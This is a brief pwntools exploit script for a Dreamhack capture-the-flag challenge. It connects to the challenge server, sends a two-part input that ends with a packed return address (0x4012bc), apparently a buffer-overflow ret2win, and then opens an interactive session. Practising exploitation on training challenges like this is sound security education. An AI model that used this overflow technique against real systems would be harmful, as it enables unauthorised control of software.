from pwn import process, remote, context, p32, p64, gdb

REMOTE = True
context.log_level = 'debug'

if REMOTE:
 p = remote('host3.dreamhack.games',11844)
else:
 p = process('steam-run ./chall', shell=True)

payload = b'cherryaidiowoqeoqwjoejpwqweiowqejoqejowoie'
p.recvuntil(b":")
assert len(payload[:0x10]) == 0x10
p.send(payload[:0x10])
p.recvuntil(b":")
p.send(payload[0x10:] + p64(0x00000000004012bc))
p.interactive()

